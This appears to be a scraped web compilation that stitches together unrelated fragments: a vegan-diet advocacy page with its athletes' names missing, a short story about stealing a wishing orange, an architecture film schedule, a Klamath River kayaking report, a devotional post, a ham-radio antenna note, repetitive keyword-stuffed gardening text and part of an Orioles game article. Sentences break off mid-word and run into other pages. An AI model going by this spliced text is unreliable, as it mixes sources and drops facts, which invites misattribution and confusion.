diet</h2>   <p>Despite vegan diets being widely accepted by all major dietitians associations, there is still a distinct hostility towards the vegan diet, particularly with some online bloggers who feel that the validity of their chosen diet is being threatened by research which supports veganism as a healthy diet. Unable to hold their ground against a number of major studies supporting veganism, some bloggers have turned to new claims that &#x2018;optimal nutrition&#x2019; cannot be achieved on a vegan diet. Though we can not, at this stage&#xa0;in our understanding of the human body, know what&#xa0;constitutes an&#xa0;&#x2018;optimal&#x2019; diet for the average human, these examples of arguably optimal humans do cast some doubt on the speculatory claims of these bloggers:</p>   <ul>    <li>:&#xa0;Germany&#x2019;s Strongest Man in 2011 and during 2013 he broke the world record for the most weight ever carried ().</li>    <li>: World champion UFC fighter, 2007</li>    <li>: World champion UFC fighter, 2009</li>    <li>: World-class boxer and&#xa0;winner the US title in 2008, 2010, 2013 and 2014 and the Golden Gloves 2009, 2011 and 2013.</li>    <li>: World-class bodybuilder who is now vegan (and interestingly was Elton John&#x2019;s personal bodyguard for more than a decade).</li>    <li>: Record breaking rock climber,&#xa0;&#xa0;the only woman to have&#xa0;&#xa0;a&#xa0;&#xa0;climb.</li>    <li>: Professional boxer holding several titles and, as of 2014, is&#xa0;Ring Magazine&#x2019;s number 5, Best Pound for Pound boxer in the world.</li>    <li>: One of the worlds most successful ultra-marathon runners. Hold several records and 3 consecutive &#x201c;Male ultra-runner of the year&#x201d; awards.</li>    <li>: A professional boxer holding Cruiserweight and Heavyweight world titles.</li>    <li>: 2009 world champion free-runner (and funnily enough, one of the Death Eaters in the last Harry Potter movie).</li>   </ul>   <dl>    <dd>     Patrik Baboumian breaking the world record for the most weight ever carried (2013)    </dd>   </dl>   <p>Particularly interesting is the <em>proportion</em> of vegan super-athletes. For example, at the time of writing, vegans fighters have won a quarter of the UFC/TUF world championships in the welterweight division in the last 8 years. The proportion of vegan fighters entering these tournaments is <em>significantly lower</em>.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <h2>Eating meat and&#xa0;animal products can hurt the environment</h2>   <ol>    <li><strong>Food and Agriculture Organisation of the United Nations:</strong>&#xa0;&#x201c;The livestock sector emerges as one of the top two or three most significant contributors to the most serious environmental problems, at every scale from local to global.&#x201d; and &#x201c;The livestock sector is a major stressor on many ecosystems and on the planet as a whole. Globally it is one of the largest sources of greenhouse gasses and one of the leading causal factors in the loss of biodiversity, while in developed and emerging countries it is perhaps the leading source of water pollution.&#x201d;[5] and &#x201c;As a large user of natural resources and contributor&#xa0;to climate change, the livestock sector&#xa0;needs to address its environmental footprint.&#x201d;[6]</li>    <li><strong>30% of the word&#x2019;s total ice-free land surface</strong> is used to solely to support animals grown for meat, eggs or dairy products [7]. In Australia more than 50% of the natural vegetation has been turned to grazing, primarily for cattle [8]. &#xa0;In Brazil, 70% of all original rain-forest has been destroyed for grazing [7]. These are very significant and statistics.</li>    <li><strong>Australian Bureau of Statistics:</strong>&#xa0;&#x201c;Grazing accounts for just over half of all land use. Environmental issues associated with sheep and cattle grazing include habitat loss, surface soil loss, salinity, and soil and water quality issues.&#x201d; [8]</li>    <li><strong>Center for Biological Diversity (USA):</strong> &#x201c;Cattle destroy native vegetation, damage soils and stream banks, and contaminate waterways with fecal waste. After decades of livestock grazing, once-lush streams and riparian forests have been reduced to flat, dry wastelands; once-rich topsoil has been turned to dust, causing soil erosion, stream sedimentation and wholesale elimination of some aquatic habitats&#x201d; [11]</li>   </ol>   <dl>    <dt>     Effect of cattle grazing along a riverbed in Australia.

Diets high in vegetables, fruits, whole grains and beans can help prevent these diseases and promote health in a variety of ways. [&#x2026;] The majority of the protein foods consumed in the U.S. are meat and animal products, which are often high in saturated fat and cholesterol, as opposed to the moatching on twigs but making little sound. Black shapes loomed ten or fifteen feet from the floor of the night, making the orchard an alien labyrinth. Peacocks shrieked in the distance. Tree branches drooped, offering leafy boughs and thorns, sweet fruit and rancid windfalls, the scent shifting between early blossoms and winter decay.</p>   <p>Coppery sodium-vapor light, reflected from ragged clouds overhead, limned a clearing occupied by one weathered shed and a tree. I saw the root stock, its few crooked stems carrying stunted, nearly-fossilized brown globes. From that dreary nest lifted a smooth gray trunk shrouded in waxy leaves, fruited in golden constellations.</p>   <p>The main tree, the scion. A dwarf Yggdrasil? A Tsarina&#x2019;s Faberge toy? It should flourish jade leaves and moonstone blossoms, its silver trunk springing from a golden urn in a museum.</p>   <p>The next glance showed me brown-edged and yellowed leaves. The tree was dying, certainly distressed.</p>   <p>&#x201c;What now?&#x201d; I whispered.</p>   <p>&#x201c;Start the count. You pick where.&#x201d;</p>   <p>I considered one heavy fruit among many. An orange. Unmysterious. I could buy its cousin at any grocery. But I remembered childhood and hand-colored books: Eve&#x2019;s apple, Hellenic myths, Arabian Nights tales of forbidden orchards.</p>   <p>Another dour medieval legend surfaced: &#x201c;I can&#x2019;t,&#x201d; I said. &#x201c;Women supposedly blighted orange trees with a single touch.&#x201d;</p>   <p>&#x201c;Are you a virgin, then?&#x201d;</p>   <p>&#x201c;Watch your mouth! I went to college.&#x201d;</p>   <p>&#x201c;And you remember it?&#x201d;</p>   <p>&#x201c;Sadly, yes.&#x201d;</p>   <p>&#x201c;We&#x2019;ll risk it. Have you gloves?&#x201d;</p>   <p>I saw his grin, in the copper light. &#x201c;Gloves, he wants,&#x201d; I told the tree. &#x201c;We&#x2019;ll need a lawyer if we get caught.&#x201d;</p>   <p>&#x201c;For an orange or two? From necromancers who put pickled animals on pedestals? What a world you live in. Choose, lady.&#x201d;</p>   <p>I pointed into the dark green void at one fruit. No different than its fellows. Merely the first my eyes found. &#x201c;That one.&#x201d;</p>   <p>He pointed from that to the next, whispering each number until &#x2013; &#x201c;Thirteen!&#x201d; He snapped the last orange from its twig with a tiny snick. He tucked the fruit into his jacket. Then he reached up and snagged my orange. &#x201c;Here. They&#x2019;re blood oranges. You can&#x2019;t find them often in the markets you frequent, I&#x2019;d guess. Your wage.&#x201d; The easy arrogance in his voice stung me, did not sting me at all. The strong, clean citrus smell was worth that much.</p>   <p>A tardy alarm shrilled near the main house. We&#x2019;d left the gate open. A sensor woke. Lights stuttered on. Peacocks wailed. I heard a man&#x2019;s voice raised in question.</p>   <p>We ran. Like Cinderella, I lost a shoe on the way. The boy darted through the gate. As I passed, it brushed my arm and bestowed a kissing shock. But the Mare waited, her ignition blessedly loyal. While flashlights still stabbed through the dark orchard, we rocketed away, laughing like fools.</p>   <p>No one followed us. I stopped near an all-night taqueria. Untrimmed palm trees edged the street, their papery brown fronds creaking in a light breeze. In the parking lot, half a dozen members of a local low-rider club whooped and made their cars buck to music.</p>   <p>The boy dug out a gem-hilted knife from his jacket. He began to peel his prize in neat cuts quartering the ruddy skin.</p>   <p>&#x201c;What about your father?&#x201d;</p>   <p>&#x201c;He wanted the cuttings to renew our orchards. He said the ripe fruit was useless unless it had grown from our soil. I don&#x2019;t see why. One orange might spawn more trees from its seeds than one cutting.&#x201d;</p>   <p>&#x201c;No,&#x201d; I said, remembering the citrus addict&#x2019;s books. &#x201c;Cross-pollination. The tree bloomed in that orchard with other oranges. There are still thousands of citrus trees in this valley. God knows what you&#x2019;d get from the seeds. Only a cutting would grow true to the strain.&#x201d;</p>   <p>His knife trembled across the orange&#x2019;s pitted skin, stopped in mid-cut. He looked back at me, then out across the city. He smiled.</p>   <p>&#x201c;No.&#x201d; I made it final by turning off the Mare&#x2019;s engine. &#x201c;We are not going back.&#x201d;</p>   <p>&#x201c;I&#x2019;m not, either. Going back, I mean. To my land.&#x201d;</p>   <p>&#x201c;Your land.&#x201d;</p>   <p>My companion shrugged. &#x201c;I thought I had failed. But if I stay here, I haven&#x2019;t. It would be my life to return without the cuttings. And I do not think I would like my life much, if they took root in our soil.&#x201d; His eyes held an ageless fear. &#x201c;Our soil &#x2013; changes things. Sometimes not for the better. But this orange? This is for me.&#x201d;</p>   <p>&#x201c;All this for an orange?&#x201d;</p>   <p>He gave me the knife hilt-first in a courtly flourish. &#x201c;For this orange, yes. Try yours.&#x201d;</p>   <p>I took the knife. Held my wage untouched in my hand, and watched him.</p>   <p>He peeled thirteen sections away from the pith. The boy bit into the first wedge, trailing white membranes from the nipped edge. The dark-red, shredded pulp vesicles looked more like organ meat than fruit. &#x201c;Not hungry?&#x201d; he teased.</p>   <p>I felt like a drunk teenager on a dangerous dare. One wish. Love or talent? Or wealth, which might buy facsimiles of both? A better life, certainly. It wouldn&#x2019;t be wrong to eat this orange. Only wasteful. I might never paint again. But I&#x2019;d never forget how I&#x2019;d felt, in that sunset moment when I could paint whatever I chose. And let lapse the gift to help a stranger.</p>   <p>&#x201c;I&#x2019;ll keep it.&#x201d; I handed back the knife. &#x201c;How is yours?&#x201d;</p>   <p>&#x201c;Beautiful.&#x201d;</p>   <p>In the brief, silken silence I remembered the day&#x2019;s embryonic pictures. If I reached for them, they&#x2019;d vanish.</p>   <p>Remembering them was torment. Forgetting them, unthinkable.</p>   <p>The boy tucked twelve orange segments into his jacket, then opened the car door.</p>   <p>&#x201c;Where are you going?&#x201d;</p>   <p>&#x201c;To find real magic. The kind you have, lady. There&#x2019;s more power here than in any place I know, and I want it. Thank you for showing it to me.&#x201d; He leaned over and kissed me briefly on the lips. The scent of the orchard rose from his hair and skin.</p>   <p>&#x201c;How will you get back to &#x2013; to Nevada?&#x201d; I asked, as the secondhand taste of the wishing-orange stung my lips, the tip of my tongue.</p>   <p>&#x201c;Who cares? I&#x2019;d rather see this world first.&#x201d; He set the treasure bag on the passenger&#x2019;s seat. Then he walked away from the Mare.</p>   <p>&#x201c;Wait!&#x201d;</p>   <p>Some of the low-riders looked over and laughed, not cruelly, at a plain middle-aged woman calling after some jail-bait hustler. The boy didn&#x2019;t look back. The palm-fronds closed behind him.</p>   <p>&#x201c;You can&#x2019;t survive here,&#x201d; I began. &#x201c;Oh, hell.&#x201d; How would I even report him to the police?</p>   <p>Who&#x2019;d believe me? I looked at the top half of my face in the rear-view mirror. A data-entry clerk. A non-entity who thought she was an artist. Whose paintings died stillborn between mind and paper.</p>   <p>I still smelled him and the orange.</p>   <p>Who started trends, I wondered, warming my orange in my hands. The wise, the powerful, the unconventional, the fearless, and the frightening. Maybe I should be grateful, for being last compared to a pickled shark. But today I&#x2019;d seen dreams that deserved to be painted, whether I sold them or not.</p>   <p>&#x201c;I can try,&#x201d; I said to the orange.</p>   <p>A Cadillac backfired, in tempo to a loud Latino cover of a Duran Duran song I hadn&#x2019;t heard in years. I jumped, then laughed, and wiped two decades of useless tears from my eyes. When I looked up again, I saw neon signs, glos   <div>   <p>Selected architecture films from Central Europe</p>   <p>Architecture and the transformation of the urban landscape of the Post-socialist countries have been a very inspiring theme for video artists and filmmakers. Disappearing old neighborhoods, renamed streets, new districts, the conflicts and contrasts of the street or the newly found multiculturalism of Central European cities all provided sharp lens to interpret social changes in these societies. Videos, short and feature films do not only offer new viewpoints to look at these changes, they also help our understanding of urban transformation and architectural processes in the region. In preparation for this selection we invited organizations based in Central European cities and working with architectural and urban matters to collect films and curate screenings around the theme of architecture and the city. The cooperation consists of the establishment of a Central European Architecture Film Collection as well as of a series of screenings of experimental videos, documentary shorts and reportages from Bratislava, Brno, Prague, Cracow, Warsaw and Budapest.</p>   <p><strong>April 1, 15:30, Kino, Budapest</strong> Juraj Chlpik: Petr&#x17e;alka Identity (Bratislava, 2010, 25&#x2019;) Barbara Zavarsk&#xe1;, Ale&#x161; &#x160;edivec: The Slovakian National Gallery (Bratislava, 2010, 5&#x2019;) Jan Hanus: Squat Wars (Prague, 2009, 26&#x2019;) Heidrun Holzfeind: Behind the <b>Iron</b> Gate (Warsaw, 2009, 55&#x2019;) </p>   <p><strong>June 27, Bunkier Sztuki, Cracow</strong> Juraj Chlpik: Petr&#x17e;alka Identity (Bratislava, 2010, 25&#x2019;) Heidrun Holzfeind: Behind the <b>Iron</b> Gate (Warsaw, 2009, 55&#x2019;) &#x141;ukasz Sk&#x105;pski: Guide to Cracow (2005, 18&#x2019;) Zsolt Keserue, Levente Poly&#xe1;k, &#xc1;gnes D&#xe9;nes: Rounding Off (Budapest, 2007, 24&#x2032;)</p>   <p><strong>July 2, Trap&#xe9;z padl&#xe1;s, Budapest</strong> Heidrun Holzfeind: Behind the <b>Iron</b> Gate (Warsaw, 2009, 55&#x2019;) Juraj Chlpik: Petr&#x17e;alka Identity (Bratislava, 2010, 25&#x2019;) Zsolt Keserue, Levente Poly&#xe1;k, &#xc1;gnes D&#xe9;nes: Rounding Off (Budapest, 2007, 24&#x2032;)</p>   <p><strong>July 4, Warsaw</strong></p>   <p><strong>July 7-8, Brno</strong></p>   <p><strong>July 10, Bratislava</strong></p>   <p><strong>July 14, Prague</strong></p>   <p>Partners: </p>   <p>The Central European Architecture Film and Video Exchange is supported by the International Visegrad Fund. </p>  </div>

   <div>   <p>Kayaking is a ton of fun, but for some reason we do not get out on the water as often as we would like.&#xa0;What better way to spend the 4th of July weekend than to combine our love of paddling and exploration on a <strong>4 day river float</strong>.</p>   <div>    <p>What is life if you don&#x2019;t enjoy it every chance you get?</p>   </div>   <p>With the current drought our choices were limited but the Klamath River sounded like a great idea. There are <strong>some class II and III rapids</strong> but long stretches allow for sitting back,&#xa0;relaxing, and letting the river do the work. We planned an <strong>84-mile float from <b>Iron</b> Gate Dam to Happy Camp</strong>&#xa0;using&#xa0; as our guide. Most of our&#xa0;planned route was&#xa0;inside Klamath National Forest.</p>   <p>Our boats are not whitewater kayaks by any means. Luke and I are the proud owners&#xa0;of Wilderness Systems Tsunamis; the 125 and 120, respectively. At 12.5 and 12 feet, these are great all-around touring boats. We felt confident in our ability to run the river successfully with a few portages, but we made sure to have all our safety equipment just in case (helmet, rope, life vests, 10 essentials).</p>   <div>    <p>Kayaks ready to launch just below the <b>Iron</b> Gate Dam.</p>   </div>   <h2><strong>Day 1: 20 miles, put-in &#x2013; <b>Iron</b> Gate Dam&#xa0;</strong></h2>   <p>We camped at the Curley Jack&#xa0;campground outside&#xa0;Happy Camp ($15/night for camping)&#xa0;and left our car in the&#xa0;long-term parking lot. An hour and a half drive later, we arrived at our put-in and left the&#xa0;other car in a turnout by the <b>Iron</b> Gate Hatchery.</p>   <p>The area just below the <b>Iron</b> Gate Dam attracts many rafters and other leisurely boaters since it is so calm. We went 20 miles our first day with no problem. Well, with the exception of Luke flipping his boat and banging up his knees.</p>   <div>    <p>I&#x2019;m a bit embarrassed that for years I thought the lyrics were &#x201c;Glorified version of a pelican.&#x201d;</p>   </div>   <div>    <p>There were so many turtles along the shores of the river. The problem was that they would dive when I got to close and the kayak was in constnat motion.</p>   </div>   <p>One of the great aspects of being on the water in these remote areas is the wildlife. I have never seen so many turtles. Their little heads were sticking out of the water all along the shore.&#xa0;We also saw osprey; they were perched on their nests, flying above us, and even diving into the river just in front of us. Great Blue Herons lined the shorelines like ancient guardians of the wilderness.&#xa0;Another main attraction was the two&#xa0;Bald Eagles. We were told that there are 40-50 breeding pairs in the area.</p>   <div>    <p>One of the first rapids we encountered. Sharon took it like a pro.</p>   </div>   <h2><strong>Day 2: 25 miles, Class II and III rapids</strong></h2>   <p>Our second day was a little more exciting. Miles 20-45 have a few Class II rapids as well as the Class III Schoolhouse and Honolulu Rapids which we chose to walk around. We camped on an island near mile 45.</p>   <div>    <p>Ready to go!</p>   </div>   <h2><strong>Day 3: 20 miles, many Class II and III rapids</strong></h2>   <p>The&#xa0;3rd day was to&#xa0;be the most difficult with&#xa0;several Class II and Class III rapids.&#xa0;However, the river is currently at its lower runnable limit so we managed to paddle through several rapids we planned on bypassing.&#xa0;The thought that kept us going was that from mile 70&#xa0;it would be smooth sailing through our take-out at mile 84.</p>   <div>    <p>Water rushing over boulders has a Zen quality to it.</p>   </div>   <p>We were almost scott-free when&#xa0;Luke decided to fall out of his kayak just before Otter&#x2019;s Playpen at mile 65. He wasn&#x2019;t even going through a rapid at the time. As the current dragged us downstream, I knew I had no choice but to run the rapid. I made it though and pulled my kayak ashore. As I turned around, I saw Luke&#x2019;s paddle float by. Then his kayak. With panic setting in, I turned to see Luke standing on a rock outcropping in the middle of the rapid. He was screaming at me to go after the kayak!</p>   <div>    <p>So many deer on the road, but also a few in the river.</p>   </div>   <h3><strong>The Rescue Mission</strong></h3>   <p>He later recollected, &#x201c;Knowing I wasn&#x2019;t going to get to shore in time, I kept my feet in front of me and tried using the kayak as a bit of a shield. The strategy worked as I managed to stop myself on a rock island in the middle of the rapid. With adrenaline pumping, I climbed up the large boulder and tried to hang on to my kayak, with my precious camera gear, but the current was too strong. It was either me or the boat, and I had to let go.&#x201d;</p>   <p>I didn&#x2019;t go after the kayak; instead, I went after Luke. He had signaled that he needed rope so I grabbed my throw-rope and ran along the shore towards him. After tying off the rope it took several attempts to toss it to&#xa0;him. I braced&#xa0;myself as Luke jumped into the Playpen holding onto the rope for dear life.</p>   <p>He was able to make it to shore. Once we were both safe, the thought of his kayak, camera gear, and camping equipment began to haunt us. It had all floated downriver. Would it join the mountain of garbage in the ocean? Would insurance cover the loss?</p>   <p>&#x201c;I was a bit frantic about the loss of my brand new camera and all our camping gear, but I was happy that I made it out alive and not even hurt. Sharon kept me calm and collected and focused.&#x201d;</p>   <p>The insurance claim would have to wait. For now, we had to find a way to reach Hwy 96. The sun was starting to set and we were wet. Our sleeping bags and dry clothes were downriver. All of my gear and the remaining kayak needed to be dragged up the embankment. Luckily, just after reaching the road, Forest Service employees drove by and I was able to wave them down. They called Officer White to the scene so we could load everything into his truck and be taken back to our car.</p>   <div>    <p>Our info source stated that the crux was to avoid these rocks. We did so by portaging around the rapid.</p>   </div>   <p>&#x201c;Do you guys ever recover kayaks?&#x201d; Luke asked, trying to figure out the chances of getting our gear back. &#x201c;We do all the time. One of my primary jobs is recovering the bodies that typically accompany them.&#x201d; Officer White responded.</p>   <h3><strong>A Shocking Recovery</strong></h3>   <p>As we were packing up, an SUV stopped and the men inside asked if we lost a kayak.</p>   <p>YES! We had! What luck! Kris&#xa0;and his family from the &#xa0;had found Luke&#x2019;s kayak about 1.5 miles downstream and they were looking for us. Kris and his female friend, Lona, were driving back&#xa0;from a day of rafting, when she noticed a kayak without the owner floating down the river. Kris fetched his kayak&#xa0;and&#xa0;paddled to grab not only the kayak but also the paddle. He then paddled back upriver towing all the gear. Truly amazing. We are so grateful!</p>   <p>&#x201c;As I approached the kayak, I saw something floating next to it. I thought it was going to be a body. I really didn&#x2019;t want that today. Luckily it wasn&#x2019;t a body.&#x201d; Kris told us.</p>   <p>We spent the night at the&#xa0;resort; our nerves were too shaken to return to the river. A return visit will be needed to finish the run, especially since Officer White told us the final stretch is the prettiest bit of the river.</p>   <div>    <p>The folks that found and returned my kayak operated this lodge. Gorgeus scenery with a gazebo right by the creek. If you need a place to stay and you&#x2019;re in the area, make sure to give them your business.</p>   </div>   <p>We owe so much gratitude to the visiting Forest Rangers, Officer White of the Klamath National Forest, and the gang at Thompson Creek Resort. What could have been a terrible weekend turned into a great&#xa0;memory and an exiting story.</p>  </div>  
sy automobiles, and jeans-clad dancers. Women laughing. Men making love to women in a roundabout way, their cars dancing like courting birds of paradise. I saw joy. And I saw, finally, how to paint it.</p>   <p>I felt the muse&#x2019;s moment stretch into a minute, then eternity.</p>   <p>#</p>   <p><span>After learning how to transmute otherworldly gold and gems into actual money, I gave the Mare a new engine.</span></p>   <p>I work in the same adobe studio under a grove of feathery mesquite trees atop a low red hill, ten miles north of Wickenburg.</p>   <p>I don&#x2019;t know if I have the thirteenth orange. If the boy cheated himself, while the real magic sleeps above my worktable.&#xa0;I stuck cloves into the orange, knotted it into a tether of silk ribbon. The scent is still strong enough to flavor the entire studio with lush night and wheeling stars. It astonishes visitors.</p>   <p>When I paint, one window looks south over the desert, to the mountains and mirages of Phoenix. The other gives me pure north light, and a view down a winding dirt road toward the highway to Nevada.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>  
   <div>   <h2>Sunday Stillness &#x2013; Deuteronomy 33:25</h2>   <div>    <p>Watercolour Painting by Janis Cox, 2013 based on an ad I found at   </div>   <p>Last Sunday the Sunday School in Arizona asked me to do the Storyteller&#x2019;s part for the children&#x2019;s service. I had done this a couple of times last spring. I received the story and realized it was a Proverb &#x2013; not a real story.</p>   <p>Of course, Satan tried to have a field day with me. He told me, &#x201c;You can&#x2019;t do this.&#x201d; I felt confused. Then I said to myself, &#x201c;No way, Satan, you are NOT getting to me. I have Jesus to give me strength, words and confidence.&#x201d;</p>   <p>In my weakness &#x2013; I kept saying &#x2013; He is strong. And He was. Even though I didn&#x2019;t feel adequate at all, I kept trusting Jesus to pull me through. And He did in a marvellous way. I had a great time. I thoroughly enjoyed myself.</p>   <p>So this pair of sandals is my vision for this strength. There are two very different versions for this passage. In the New Kings James Version it is sandals.</p>   <blockquote>    <p>Your sandals&#xa0;<i>shall be</i>&#xa0;iron and bronze; As your days,&#xa0;<i>so shall</i>&#xa0;your strength&#xa0;<i>be (, NKJV).</i></p>   </blockquote>   <p>But check out what the NIV says:</p>   <blockquote>    <p>The bolts of your gates will be iron and bronze, and your strength will equal your days.</p>   </blockquote>   <p>And The Message:</p>   <blockquote>    <p>Safe behind iron-clad doors and gates, your strength like iron as long as you live.</p>   </blockquote>   <p>I decided it didn&#x2019;t matter what the vision &#x2013; the strength is the same. I like the idea that:</p>   <h3> (Tweetable)</h3>   <p>The whole point is &#x2013; God gave me strength. I allowed Him to be the strength in my weakness. And I enjoyed the journey.</p>   <h2>Today is Sunday Stillness &#x2013; be still before Him.</h2>   <h2>Stop and feel His touch.</h2>   <p>Blessings,</p>   <p><em>Janis</em></p>   <div>    <p>Do you have a Scripture that spoke to you this week?

   <div>   <p>I live in an HOA (Home Owners Association) neighborhood in Gilbert, Arizona. What that means is &#x201c;No Antennas&#x201d;. What that means to me is &#x201c;No Antennas that are permanent and can be easily seen&#x201d;. I choose to live in this neighborhood so I don&#x2019;t blame the HOA for restricting my antenna choices. I also wouldn&#x2019;t put up an antenna that would be an &#x2018;eye-sore&#x2019; to my neighbors.</p>   <p>My Antenna is a 31&#x2032; tall, vertical fiberglass pole with a 16g wire down the middle. It is telescopic from 4&#x2032; to 31&#x2032;. You twist lock each 4 foot section together as you extend the sections. It goes up or down in about 1 minute. To date is has been an excellent antenna and very low cost. I have worked a lot of DX for such a simple install.</p>   <p>At the base of the antenna is a 4:1 homebrew UNUN and an extensive ground radial network. I have twenty five, 31&#x2032; copper wires that fan out from the mounting point. There is also an 8&#x2032; copper ground rod, driven straight down, to provide the central &#x2018;tie&#x2019; point and an earth ground. You can see in the 1st picture above a rod iron fence at the north end of the yard. Some of the radials meet up with the 81&#x2032; fence and I have terminated them to it. It really made a difference and provides a nice extended ground-plane. </p>  </div>

   <div>      <p>Vegetable gardening in Rillito AZ 85654 can be a wonderful hobby that anyone in Rillito AZ 85654 can start regardless of age. Usually when people start this hobby they quickly get hooked on to it. Even though it is simple, there are a lot of things which you have to learn if you want to take on gardening seriously. You should take steps to educate yourself and increase your knowledge of becoming a good gardener in Rillito AZ 85654. Thankfully there are many ways available now through which you can acquire the necessary knowledge.</p>   <p>In this article, we shall discuss a few key points when you are just starting out with vegetable gardening. I shall also mention a few other sources where you can get additional information.</p>   <p>1. Decide what vegetables want to grow in Rillito AZ 85654. You need warm for some vegetables while others need colder climates. So the place where you stay and the season can play an important role in selecting the vegetables you want to grow. Cabbage, lettuce and peas need cooler climates. These vegetable plants should get sufficient amount of time to mature before the weather becomes warm otherwise they may die or seed prematurely. On the hand, tomatoes, cucumbers and sweet corn grow well in warm climates. They need average temperatures between 60-95 degrees Fahrenheit.</p>   <p>2. When you have selected a vegetable, the next step is to research the soil quality in your home where you want to plant the vegetable. You have to make sure that the soil is really suitable for the vegetable you are trying to grow.</p>   <p>3. After confirming the soil condition, the next step would be to decide on a suitable spot in your garden in Rillito AZ 85654. The spot you choose for planting the vegetables should be such that it should not cause disturbance or inconvenience to you or other family members.</p>   <p>Secondly, the spot should receive a good amount of sunshine and adequate wind. The garden should ideally receive 6-8 hours of sunlight every day in Rillito AZ 85654. Sunlight provides energy to plants to convert carbon dioxide into sugar which they use for food. If the plants do not receive sufficient sunlight, they may not give fruits even if the plants look green and healthy. Carrots, tomatoes, radishes and beets need at least 6-8 hours of direct light every day. Plants such as lettuce, which are grown just for their leaves, can grow nicely in the shade and don&#x2019;t need direct light from the sun. In fact they may need some protection if the sun is too bright and shiny.</p>   <p>4. When you start a garden and try to maintain it, you may encounter various difficulties from time to time. You have to acquire knowledge of how to maintain your garden and what steps are needed to prevent the plants from damage. If you know someone who has experience in gardening, you can take the help of that person. If not, you have to do the research yourself. Google can be your best friend when you are looking for a solution to a specific problem.</p>   <p>You can also get hold of a few good books on gardening in Rillito AZ 85654. You can browse through hundreds of such books on Amazon. You can even read blogs on this topic where gardening experts share their tips and techniques. YouTube is another wonderful source for people who are visual learners who prefer watching instead of reading.</p>      <p>While spring officially begins March 20, the just completed warm (sometimes hot) February means gardeners in southern California need to get an early start to the growing season.</p>   <p><strong>Add Plants That Attract Good Bugs: </strong>Attract good bugs (ladybugs, lacewings, hoverflies) to your yard by adding plants they love. Plants that appeal to good bugs are yarrow, dill, fennel, marigolds, coriander and buckwheat. The good bugs will eat the bad bugs (such as aphids, ants and whiteflies) that can cause havoc in your garden.</p>   <p><strong>Give Plants And Trees A Nitrogen Boost: </strong>Now is the time to give your garden a shot in the arm with nitrogen fertilizer. Plants usually need to be fertilized only once in March at the beginning of the spring growing period and again in September in Rillito AZ 85654.</p>   <p><strong>Don&#x2019;t Give Weeds A Fighting Chance: </strong>Because February was unusually warm, the minimal rain that fell prompted weeds to sprout in southern California. Weeds can easily become out of control and much harder to remove as they take root. A natural way to protect gardens from weeds is by using mulch. This top dressing will crowd out weeds before they gain a foothold. Weed first before applying. Mulch at least two to three inches deep around trees, shrubs, flowers and plants. Make sure the mulch does not touch the tree trunks.</p>   <p><strong>Plant Vegetables and Herbs from Seed: </strong>After the last chance for frost (around mid-month) and the soil warms, cultivate your vegetable garden soil down about one foot. Mix in organic soil planting amendments. Plant warm-season vegetable seeds including tomatoes, peppers, green beans, cucumbers, squash, eggplant, onion, potatoes, spinach, turnips and corn. It&#x2019;s also the time to plant herbs from seed such as basil, mint, oregano, parsley and rosemary. You can even still plant cool-season vegetables including broccoli, lettuce, cabbage and kale. Vegetables that can be planted year round are carrots, beets and radishes.</p>   <p><strong>Keep Plants Looking Full By Dividing Perennials: </strong>After a few years, perennials tend to form in clumps. These clumps become scraggly and big bare spots form within the plants. To avoid this, divide perennials and place the new plantings in other areas of the yard. When dividing a perennial, make sure you dig deep under a clump so you lift the root system out intact. Remove any portion of the clump that looks dead or diseased. Large clumps can be divided further. Place the divided clumps in holes that fit the root base. Mix in soil amendment and water. This is a cost-efficient way to add to your flower garden.</p>   <p><strong>Keep Your Garden Manageable: </strong>It may be tempting to create a sprawling garden filled with all kinds of vegetables. Because of water restrictions projected still to be in place for summer and beyond, consider downsizing your workspace so your garden requires less water in Rillito AZ 85654. Raised beds are a good option because there is less chance of soil erosion and water runoff.</p>   <p>&#xa0;</p>  </div>

Usually fans would be discouraged from standing here by Orioles officials. But on this day a security guard stood nearby, arms folded. He had jokes.</p>     <p>&#x201c;Standing room only,&#x201d; he said.</p>     <p>There were a few muffled laughs. That&#x2019;s all you&#x2019;ll get out of Baltimoreans these days. They were gathered here because the uprising in the city &#x2013; which twice had become violent, including near the stadium &#x2013; convinced Major League Baseball to, for the first time ever, bar fans from one of its games.</p>     <p>So there they stood. The crowd never swelled to more than 50. Fans rotated in and out, tiring of the view. Some watched from the porch of the Hilton Hotel across the street.</p>     <div>      <p>Photo by Patrick Smith/Getty Images</p>     </div>     <p>A well-positioned fan could have tried to spot the action on the field by looking through the legs of a bronze Cal Ripken Jr. statue, then under the outstretched leg of mid-delivery Jim Palmer. That view would have been as good as any.</p>     <p>Fans on the right side of the fence relied on those to the left to see what the shortstops and third basemen were doing. Tall fans reported back to short ones. Cheers took an extra moment as the clear pop of the ball traveled out to the group.</p>     <p>Hurson, a public defender who lives in Northern Baltimore, hoisted his sign into the air dozens of times throughout the game, which the Orioles won 8-2. It said, &#x201c;DON&#x2019;T FORGET FREDDIE GRAY,&#x201d; with Orioles logo standing in for the letter Os.</p>     <p>Gray is the 25-year-old West Baltimore resident who died after being injured in police custody, and the reason that thousands of protesters from poor neighborhoods in Baltimore took to the streets in the first place.</p>     <p>&#x201c;I think a lot of people forget that the reason there is so much anger and frustration is police brutality, among other reasons,&#x201d; said Hurson. &#x201c;Especially today with all the coverage from around the country about how we&#x2019;re not inside, and they&#x2019;re talking about security and safety.</p>     <p>&#x201c;And the only and safety and security we should be talking about is the safety of the poor communities of Baltimore.&#x201d;</p>     <p>Hurson disagreed with the decision to shut fans out, lamenting the lost possibility of uniting people in the city.</p>     <p>Others felt the same but were angry. One woman screamed into a camera that the rioting and looting shown on national television was un-American and had caused this, the un-American exiling of a fan base from its baseball game. Near tears, she would not give her full name.</p>     <div>      <p>Tommy Gilligan-USA TODAY Sports</p>     </div>     <p>She was about as heated as the afternoon got. When those in attendance weren&#x2019;t being interviewed by reporters from national television and print outlets, they tried to take measure of how the Orioles were playing.</p>     <p>&#x201c;Next time Ubaldo pitches,&#x201d; one said, &#x201c;let&#x2019;s just all turn around and not watch.&#x201d;</p>     <p>Ubaldo Jiminez pitched seven innings without giving up an earned run Wednesday.</p>     <p>They chanted his name. Who knows if he was able to hear.</p>     <p>The fans were at times boisterous &#x2013; the traditional shout of &#x201c;Oh!&#x201d; during the national anthem rang off the walls of a nearby hotel &#x2013; but being on the outside hurt, ultimately. Camden Yards is credited with helping to rejuvenate Baltimore. It&#x2019;s retro, fan-friendly design changed the way baseball is watched across the country. Through lean years, many of them kept coming to the yard.</p>     <p>Now, on a warm day in late April, it was empty as the Orioles shredded through one of the better pitchers in the 